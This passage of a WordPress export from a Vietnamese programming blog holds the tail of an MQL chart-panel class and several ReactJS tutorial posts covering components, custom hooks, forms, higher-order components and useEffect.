            if(sparam == "1" && !this.MouseDown) {
                this.MouseDown = true;
                this.x0Mouse = lparam - this.x;
                this.y0Mouse = dparam - this.y;
                if(this.x0Mouse > 0 && this.x0Mouse < this.width && this.y0Mouse > 0 && this.y0Mouse < this.titHeight) {
                    this.MouseOnTitle = true;
                    this.showOnTop();
                }
            }
            //action when hold down mouse and move
            if(sparam == "1" && this.MouseDown) {
                if(this.MouseOnTitle) {
                    int xNew = lparam - this.x0Mouse;
                    int yNew = dparam - this.y0Mouse;

                    int xMin = 100 - this.width;
                    int yMin = 0;
                    int xMax = ChartGetInteger(0, CHART_WIDTH_IN_PIXELS, 0) - 100;
                    int yMax = ChartGetInteger(0, CHART_HEIGHT_IN_PIXELS, 0) - this.titHeight;

                    if(xNew < xMin) xNew = xMin;
                    if(yNew < yMin) yNew = yMin;
                    if(xNew > xMax) xNew = xMax;
                    if(yNew > yMax) yNew = yMax;

                    this.setPosition(xNew, yNew);
                    ChartSetInteger(ChartID(), CHART_MOUSE_SCROLL, 0);
                }
            }
            //action when up mouse
            if(sparam == "0" && this.MouseDown) {
                this.MouseDown = false;
                this.MouseOnTitle = false;
                ChartSetInteger(ChartID(), CHART_MOUSE_SCROLL, 1);
            }
        }
        if(id == CHARTEVENT_OBJECT_CLICK) {
            if(sparam == this.btnMinus) {
                this.showOnTop();
            } else if(sparam == this.btnClose) {
                this.deletePanel();
            }
        }
    }
};
//+------------------------------------------------------------------+

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>969</wp:post_id>
		<wp:post_date><![CDATA[2021-04-07 01:45:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-04-06 18:45:16]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-04-07 01:45:16]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-04-06 18:45:16]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[mql-nhung-class-hay-nhat]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mql"><![CDATA[MQL]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS - 1. Hook và Class]]></title>
		<link>https://duycode.com/2021/05/01/reactjs-1-hook-va-class/</link>
		<pubDate>Fri, 30 Apr 2021 18:00:17 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1312</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Làm quen với ReactJS</h2>
-- Demo sử dụng ReactJS bằng cách sử dụng CDN
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="app1"></div>
    <div id="app2"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>

    <script>
        let element1 = React.createElement('h1', { style: { color: 'red', fontSize: '30px' } }, 'Hello ReactJS !!!');
        ReactDOM.render(
            element1,
            document.getElementById('app1')
        );
    </script>

    <!-- muốn sử dụng JSX cần có babel và thẻ script ở dạng text/babel -->
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script type="text/babel">
        let element2 = <h1 style={{ color: 'green', fontSize: '30px' }}>Hello ReactJS !!!</h1>;

        ReactDOM.render(
            element2,
            document.getElementById('app2')
        );
    </script>
</body>
</html>
</pre>

<h2>2. Hook Component là gì</h2>
<pre>
<!DOCTYPE html>
<html lang="en">
 
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>
 
<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
 
    <script type="text/babel">
        const { useState } = React;

        // component là một function
        const App = (props) => {
            const [name, setName] = useState("Jack")
            return (
                <div>
                    <h2>Props: {props.title}</h2>
                    <h2>State: {name}</h2>
                </div>
            );
        }
 
        ReactDOM.render(
            <App title="Class Component" />,
            document.getElementById('root')
        );
    </script>
</body>
 
</html>
</pre>

<h2>3. Class Component là gì</h2>
<h3>3.1. Component - Class ES6</h3>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        class App extends React.Component {
            constructor(props) {
                super(props);
                this.state = {name: "Jack"}
            }
            render() {
                return (
                    <div>
                        <h2>Props: {this.props.title}</h2>
                        <h2>State: {this.state.name}</h2>
                    </div>
                );
            }
        }

        ReactDOM.render(
            <App title="Class Component" />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>

<h3>3.2. Bolus: Component - createClass</h3>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react.js"></script>
    <script crossorigin src="https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react-dom.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        //Trước phiên bản React 16 (đang dùng CDN phiên bản 15), ES6 chưa ra đời
        //React tự tạo Class bằng cách dùng React.createClass (và chính createClass đã được loại bỏ từ phiên bản 16)
        const App = React.createClass({
            getInitialState() {
                return {
                    name: 'Jack'
                }
            },
            render() {
                return (
                    <div>
                        <p>Props: <strong>{this.props.title}</strong></p>
                        <p>State: <strong>{this.state.name}</strong></p>
                    </div>
                )
            }
        })

        ReactDOM.render(
            <App title="Class - without ES6" />,
            document.getElementById('app')
        );
    </script>
</body>
</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1312</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 01:00:17]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-04-30 18:00:17]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 09:24:27]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 02:24:27]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-1-hook-va-class]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS - 8. Custom Hooks]]></title>
		<link>https://duycode.com/2021/05/01/reactjs-8-custom-hooks/</link>
		<pubDate>Sat, 01 May 2021 01:00:23 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1326</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Khi nhiều Component có logic giống nhau</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect } = React

        // User và Photo có logic giống hệt nhau phần get Data về
        const User = ({ url }) => {
            const [loading, setLoading] = useState(false)
            const [dataInfo, setDataInfo] = useState(null)
            const [failed, setFailed] = useState(null)

            useEffect(() => {
                setLoading(true)
                let fetching = true;
                fetch(url)
                    .then(res => {
                        if (fetching) {
                            if (res.ok) return res.json()
                            throw { status: res.status, ok: res.ok }
                        }
                    })
                    .then(res => {
                        if (fetching) {
                            setDataInfo(res)
                            setFailed(null)
                        }
                    })
                    .catch(err => {
                        if (fetching) {
                            setDataInfo(null)
                            setFailed(err)
                        }
                    })
                    .finally(() => {
                        setLoading(false)
                    })
                return () => fetching = false
            }, [url])

            console.log({ loading, dataInfo, failed })

            return (
                <div>
                    <h3>User info</h3>
                    {loading && <p>Loading...</p>}
                    {!loading && dataInfo && <p>UserInfo: {JSON.stringify(dataInfo, null, 4)}</p>}
                    {!loading && failed && <p>Failed: {JSON.stringify(failed, null, 4)}</p>}
                </div>
            )
        }

        // User và Photo có logic giống hệt nhau phần get Data về
        const Photo = ({ url }) => {
            const [loading, setLoading] = useState(false)
            const [dataInfo, setDataInfo] = useState(null)
            const [failed, setFailed] = useState(null)

            useEffect(() => {
                setLoading(true)
                let fetching = true;
                fetch(url)
                    .then(res => {
                        if (fetching) {
                            if (res.ok) return res.json()
                            throw { status: res.status, ok: res.ok }
                        }
                    })
                    .then(res => {
                        if (fetching) {
                            setDataInfo(res)
                            setFailed(null)
                        }
                    })
                    .catch(err => {
                        if (fetching) {
                            setDataInfo(null)
                            setFailed(err)
                        }
                    })
                    .finally(() => {
                        setLoading(false)
                    })
                return () => fetching = false
            }, [url])

            console.log({ loading, dataInfo, failed })

            return (
                <div>
                    <h3>Photo info</h3>
                    {loading && <p>Loading...</p>}
                    {!loading && dataInfo && <p>PhotoInfo: {JSON.stringify(dataInfo, null, 4)}</p>}
                    {!loading && failed && <p>Failed: {JSON.stringify(failed, null, 4)}</p>}
                </div>
            )
        }

        const App = () => {
            const [number, setNumber] = useState(1)
            return (
                <div>
                    <p>Number: {number}</p>
                    <button onClick={() => { setNumber(number + 1) }}>Increase</button>
                    <User url={`https://reqres.in/api/users/${number}`} />
                    <Photo url={`https://jsonplaceholder.typicode.com/photos/${number}`} />
                </div>
            )
        }

        ReactDOM.render(<App />, document.getElementById('root'))
    </script>
</body>

</html>
</pre>

<h2>2. Tạo thử 1 custom hooks có tên: useFetchData()</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect } = React

        const useFetchData = (url) => {
            const [loading, setLoading] = useState(false)
            const [dataInfo, setDataInfo] = useState(null)
            const [failed, setFailed] = useState(null)

            useEffect(() => {
                setLoading(true)
                let fetching = true;
                fetch(url)
                    .then(res => {
                        if (fetching) {
                            if (res.ok) return res.json()
                            throw { status: res.status, ok: res.ok }
                        }
                    })
                    .then(res => {
                        if (fetching) {
                            setDataInfo(res)
                            setFailed(null)
                        }
                    })
                    .catch(err => {
                        if (fetching) {
                            setDataInfo(null)
                            setFailed(err)
                        }
                    })
                    .finally(() => {
                        setLoading(false)
                    })
                return () => fetching = false
            }, [url])

            return { loading, dataInfo, failed }
        }

        // User và Photo có logic giống hệt nhau phần get Data về
        const User = ({ url }) => {
            const { loading, dataInfo, failed } = useFetchData(url)
            console.log({ loading, dataInfo, failed })

            return (
                <div>
                    <h3>User info</h3>
                    {loading && <p>Loading...</p>}
                    {!loading && dataInfo && <p>UserInfo: {JSON.stringify(dataInfo, null, 4)}</p>}
                    {!loading && failed && <p>Failed: {JSON.stringify(failed, null, 4)}</p>}
                </div>
            )
        }

        // User và Photo có logic giống hệt nhau phần get Data về
        const Photo = ({ url }) => {
            const { loading, dataInfo, failed } = useFetchData(url)
            console.log({ loading, dataInfo, failed })
            
            return (
                <div>
                    <h3>Photo info</h3>
                    {loading && <p>Loading...</p>}
                    {!loading && dataInfo && <p>PhotoInfo: {JSON.stringify(dataInfo, null, 4)}</p>}
                    {!loading && failed && <p>Failed: {JSON.stringify(failed, null, 4)}</p>}
                </div>
            )
        }

        const App = () => {
            const [number, setNumber] = useState(1)
            return (
                <div>
                    <p>Number: {number}</p>
                    <button onClick={() => { setNumber(number + 1) }}>Increase</button>
                    <User url={`https://reqres.in/api/users/${number}`} />
                    <Photo url={`https://jsonplaceholder.typicode.com/photos/${number}`} />
                </div>
            )
        }

        ReactDOM.render(<App />, document.getElementById('root'))
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1326</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 08:00:23]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-01 01:00:23]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 17:38:42]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 10:38:42]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-8-custom-hooks]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS – Form]]></title>
		<link>https://duycode.com/2021/05/02/reactjs-form/</link>
		<pubDate>Sat, 01 May 2021 18:00:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1346</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Function Component</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState } = React;

        const App = () => {
            const [username, setUsername] = useState('Micheal Jackson...')
            const [gender, setGender] = useState('1')
            const [languages, setLanguages] = useState(["Javascript", "PHP"])

            const handleChangeCheckbox = (e) => {
                let value = e.target.value;
                if (e.target.checked) {
                    setLanguages([...languages, value])
                } else {
                    setLanguages(oldLanguages => oldLanguages.filter(item => item !== value))
                }
            }

            console.log({username, gender, languages})

            return (
                <div>
                    <input value={username} type="text" name="username" onChange={(e)=>setUsername(e.target.value)} /><br /><br />

                    <select name="gender" value={gender} onChange={(e)=>setGender(e.target.value)}>
                        <option value="0">Nam</option>
                        <option value="1">Nữ</option>
                    </select><br /><br />

                    <input type="radio" id="gender0" name="gender"
                        value="0"
                        onChange={(e)=>setGender(e.target.value)}
                        checked={gender == "0"} />
                    <label htmlFor="gender0">Nam</label>

                    <input type="radio" id="gender1" name="gender"
                        value="1"
                        onChange={(e)=>setGender(e.target.value)}
                        checked={gender == "1"} />
                    <label htmlFor="gender1">Nữ</label><br /><br />

                    <input type="checkbox" name="languages" id="language0"
                        value="Javascript"
                        onChange={handleChangeCheckbox}
                        checked={languages.includes("Javascript")} />
                    <label htmlFor="language0">Javascript</label><br />

                    <input type="checkbox" name="languages" id="language1"
                        value="PHP"
                        onChange={handleChangeCheckbox}
                        checked={languages.includes("PHP")} />
                    <label htmlFor="language1">PHP</label><br />

                    <input type="checkbox" name="languages" id="language2"
                        value="C++"
                        onChange={handleChangeCheckbox}
                        checked={languages.includes("C++")} />
                    <label htmlFor="language2">C++</label><br />

                    <p>Username: <span>{username}</span></p>
                    <p>Gender: <span>{gender}</span></p>
                    <p>Languages: <span>{languages.join(", ")}</span></p>
                </div>
            );

        }

        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>

<h2>2. Class Component</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        class App extends React.Component {
            constructor(props) {
                super(props);

                this.state = {
                    username: 'Micheal Jackson...',
                    gender: '1',
                    languages: ["Javascript", "PHP"],
                }
            };

            handleChangeInput = (e) => {
                this.setState({
                    [e.target.name]: e.target.value
                });
            }

            handleChangeCheckbox = (e) => {
                let value = e.target.value;
                let languages_array = this.state.languages;
                if (e.target.checked) {
                    languages_array.push(value);
                } else {
                    languages_array = languages_array.filter(item => item !== value)
                }
                this.setState({
                    [e.target.name]: languages_array
                });
            }


            //cần set value và onchange cùng 1 lúc ở form
            render() {
                console.log(this.state);
                return (
                    <div>
                        <input value={this.state.username} type="text" name="username" onChange={this.handleChangeInput} /><br /><br />

                        <select name="gender" value={this.state.gender} onChange={this.handleChangeInput}>
                            <option value="0">Nam</option>
                            <option value="1">Nữ</option>
                        </select><br /><br />

                        <input type="radio" id="gender0" name="gender"
                            value="0"
                            onChange={this.handleChangeInput}
                            checked={this.state.gender == "0"} />
                        <label htmlFor="gender0">Nam</label>

                        <input type="radio" id="gender1" name="gender"
                            value="1"
                            onChange={this.handleChangeInput}
                            checked={this.state.gender == "1"} />
                        <label htmlFor="gender1">Nữ</label><br /><br />

                        <input type="checkbox" name="languages" id="language0"
                            value="Javascript"
                            onChange={this.handleChangeCheckbox}
                            checked={this.state.languages.includes("Javascript")} />
                        <label htmlFor="language0">Javascript</label><br />

                        <input type="checkbox" name="languages" id="language1"
                            value="PHP"
                            onChange={this.handleChangeCheckbox}
                            checked={this.state.languages.includes("PHP")} />
                        <label htmlFor="language1">PHP</label><br />

                        <input type="checkbox" name="languages" id="language2"
                            value="C++"
                            onChange={this.handleChangeCheckbox}
                            checked={this.state.languages.includes("C++")} />
                        <label htmlFor="language2">C++</label><br />

                        <p>Username: <span>{this.state.username}</span></p>
                        <p>Gender: <span>{this.state.gender}</span></p>
                        <p>Languages: <span>{this.state.languages.join(", ")}</span></p>
                    </div>
                );
            }
        }

        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1346</wp:post_id>
		<wp:post_date><![CDATA[2021-05-02 01:00:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-01 18:00:04]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 14:08:24]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 07:08:24]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-form]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS – 9. Higher-Order Components (HOC)]]></title>
		<link>https://duycode.com/2021/05/01/reactjs-9-higher-order-components-hoc/</link>
		<pubDate>Sat, 01 May 2021 02:00:07 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1348</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Đặt vấn đề</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect } = React

        // Hình chữ nhật và hình tròn có logic về opacity khá giống nhau
        const Rectangle = () => {
            const [opacity, setOpacity] = useState(1);
            return (
                <div
                    style={{ opacity }}
                    onMouseEnter={() => setOpacity(0.5)}
                    onMouseLeave={() => setOpacity(1)}
                >
                    <div style={{ width: 200, height: 100, backgroundColor: "green" }}></div>
                </div>
            )
        }

        // Hình chữ nhật và hình tròn có logic về opacity khá giống nhau
        const Circle = ({ url }) => {
            const [opacity, setOpacity] = useState(1);
            return (
                <div
                    style={{ opacity }}
                    onMouseEnter={() => setOpacity(0.5)}
                    onMouseLeave={() => setOpacity(1)}
                >
                    <div style={{ width: 100, height: 100, backgroundColor: "violet", borderRadius: "50%" }}></div>
                </div>
            )
        }


        const App = () => {
            return (
                <div>
                    <Circle />
                    <Rectangle />
                </div>
            )
        }

        ReactDOM.render(<App />, document.getElementById('root'))
    </script>
</body>

</html>
</pre>

<h2>2. Dùng HOC để giải quyết các logic trùng lặp</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect } = React

        // Tạo 1 HOC nhận vào một Component và trả về một Component
        // HOC này dự định sẽ dùng chung cho mọi Component có logic di chuột vào làm mờ hình
        const withHoverOpacity = (CustomComponent) => () => { 
            const [opacity, setOpacity] = useState(1);
            return (
                <div
                    style={{ opacity }}
                    onMouseEnter={() => setOpacity(0.5)}
                    onMouseLeave={() => setOpacity(1)}
                >
                    <CustomComponent/>
                </div>
            )
        }

        const Rectangle = () => <div style={{ width: 200, height: 100, backgroundColor: "green" }}></div>
        const Circle = () => <div style={{ width: 100, height: 100, backgroundColor: "violet", borderRadius: "50%" }}></div>
    
        // Tạo thêm 1 component cha từ HOC bọc lại Component ban đầu
        const RectangleWithHover = withHoverOpacity(Rectangle)
        const CircleWithHover = withHoverOpacity(Circle)

        const App = () => {
            return (
                <div>
                    <RectangleWithHover />
                    <CircleWithHover />
                </div>
            )
        }

        ReactDOM.render(<App />, document.getElementById('root'))
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1348</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 09:00:07]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-01 02:00:07]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 18:00:58]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 11:00:58]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-9-higher-order-components-hoc]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS - 5. useEffect]]></title>
		<link>https://duycode.com/2021/05/01/reactjs-5-useeffect/</link>
		<pubDate>Fri, 30 Apr 2021 22:00:52 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1382</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect, useRef } = React

        function App(props) {
            const [count, setCount] = useState(0)
            const [number, setNumber] = useState(0)

            useEffect(() => {
                console.log("Dependencies = [count] =>= Chạy khi 'count' thay đổi")
                setNumber(number + 1)
                return ()=> {
                    console.log("Cleanup [count] ==> Cleanup trước khi chạy code trong useEffect [count] --")
                }
            }, [count])

            console.log("1. Luôn luôn chạy, và code bên ngoài luôn chạy trước code trong useEffect")

            useEffect(() => {
                console.log("Dependencies = [] ==> Chạy duy nhất 1 lần khi khởi tại")
                return ()=> {
                    console.log("Cleanup []")
                }
            }, [])

            useEffect(() => {
                console.log("Dependencies = undefined ==> Luôn luôn chạy")
                return ()=> {
                    console.log("Cleanup undefined")
                }
            })

            // 2. Chạy render
            return (
                <div>
                    <p>Count: {count}</p>
                    <button onClick={() => { setCount(count + 1) }}> Increase </button>

                    <p>Number: {count}</p>
                    <button onClick={() => { setNumber(number + 1) }}> Increase </button>
                </div>
            )
        }

        ReactDOM.render(<App />, document.getElementById('app'))
    </script>
</body>

</html>
</pre>

<h2>1. Side effects có 2 loại</h2>
1.1. Effects không cần clean up
-- Gọi API lấy dữ liệu
-- Tương tác với DOM
1.2. Effects cần clean up
-- Subscriptions
-- setTimeout, setInterval


<h2>2. Cấu trúc useEffect</h2>
<pre>
const useEffect = React.useEffect
function App(props) {
    useEffect(() => {
        //code 'side effect'
        return () => {
            //code 'cleanup'
        }
    },
        //vị trí 'dependencies'
        []
    )
    return <div>rendering</div>
}
</pre>

1. Mouting: Code chạy lần đầu
-- Run rendering
-- Run code khu vực 'side effect'

2. Khi Updating
-- Run rendering
-- Run code khu vực 'cleanup' nếu 'dependencies' thay đổi
-- Run code khu vực 'side effect' nếu 'dependencies' thay đổi

3. Khi Unmounting
-- Run code khu vực 'cleanup'


<h2>3. Sự khác nhau giữa các cách viết dependencies</h2>
-- 1. Không khai báo 'dependencies'
<pre>
    useEffect(() => {
        // code 'side effect' ---> luôn chạy sau mỗi lần render
        return () => {
            // code 'cleanup'
        }
    })
    return <div>rendering</div>
</pre>

-- 2. Nếu là 1 mảng rỗng: [] 
<pre>
    useEffect(() => {
        // code 'side effect' ---> chạy đúng 1 lần duy nhất sau lần render đầu tiên (tương tự ComponentDidmount)
        return () => {
            // code 'cleanup' --> chạy đúng 1 lần khi unmount (tương tự ComponentWilUnmout)
        }
    },[])
    return <div>rendering</div>
</pre>

-- 3. Nếu là 1 mảng có dữ liệu: [custom] 
<pre>
    useEffect(() => {
        // code 'side effect'
        // chạy lần khi render lần đầu tiên
        // các lần render tiếp theo phụ thuộc vào 'dependencies' có thay đổi hay không
        return () => {
            // code 'cleanup'
            // nếu 'dependencies' thay đổi --> chạy 'cleanup' --> sau đó chạy 'side effect'
        }
    },[custom])
    return <div>rendering</div>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1382</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 05:00:52]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-04-30 22:00:52]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-06-15 14:43:45]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-06-15 07:43:45]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
